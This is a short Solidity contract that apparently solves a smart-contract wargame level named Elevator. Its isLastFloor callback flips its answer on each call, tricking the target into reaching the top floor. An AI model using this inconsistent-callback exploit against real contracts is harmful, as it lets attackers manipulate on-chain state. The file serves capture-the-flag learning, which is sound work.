// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

// ================================================================
// │                        LEVEL 11 - ELEVATOR                   │
// ================================================================
interface IElevator {
    function goTo(uint256 _floor) external;
}

contract Building {
    IElevator targetContract;
    bool public last = true;

    constructor(address _targetContractAddress) payable {
        targetContract = IElevator(_targetContractAddress);
    }

    function isLastFloor(uint256 _floor) public returns (bool) {
        if (_floor > 0) {
            last = !last;
            return last;
        } else {
            revert("Invalid floor");
        }
    }

    function attack() public {
        targetContract.goTo(1);
    }
}
